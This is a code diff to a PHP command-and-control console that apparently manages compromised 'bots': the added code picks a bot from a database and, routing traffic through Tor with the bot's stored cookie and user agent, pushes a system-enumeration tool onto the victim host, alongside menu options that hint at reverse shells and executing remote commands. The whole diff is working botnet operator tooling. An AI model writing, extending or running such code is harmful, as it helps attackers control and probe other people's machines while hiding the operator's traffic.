@@ -10,7 +10,7 @@ use crypto\decryptShellResponses\decryptor;
 //end pipe dream.
 
 // communications
-use bots\bot_files\hereEatThis;
+use curlStuff\defaultClient\genericChunkFileTransfer;
 use curlStuff\defaultClient\genericClientExecuteCommands;
 use curlStuff\mainCurl;
 use curlStuff\validateMeMore\talkToMeDamnit;
@@ -104,7 +104,35 @@ while (true) {
         case str_starts_with($c, "sys") !== false:
             system(CLEAR);
             $m->enumSystemMenu();
-            $a = new hereEatThis();
+            $selectedEntry = pagination();
+            $bot = database->insertData(["action" => "grabBot", "botID" => $selectedEntry]);
+            $a = new genericChunkFileTransfer([
+                "base_uri" => sprintf("%s://%s", $bot[0]['proto'], $bot[0]['rhost']),
+                "timeout" => 5,
+                "allow_redirects" => false,
+                "proxy" => [
+                    "http" => $d->tor,
+                    "https" => $d->tor
+                ],
+                "cookies" => true,
+                "protocols" => $bot[0]['proto'],
+                "strict" => false,
+                "referrer" => false,
+                "track-redirects" => true
+            ]);
+            $a->chunkTransferFile($bot[0]['uri'],
+                [
+                    'headers' => [
+                        "User-Agent" => $bot[0]['agent']
+                    ]
+                ],
+                [
+                    "uuid" => $bot[0]['uuid'],
+                    "cname" => $bot[0]['cname'],
+                    "cval" => $bot[0]['cvalue'],
+                ],
+                "lib/tools/enumSystem/enumerateSystem"
+            );
             break;
         case str_starts_with($c, "rev") !== false:
             system(CLEAR);
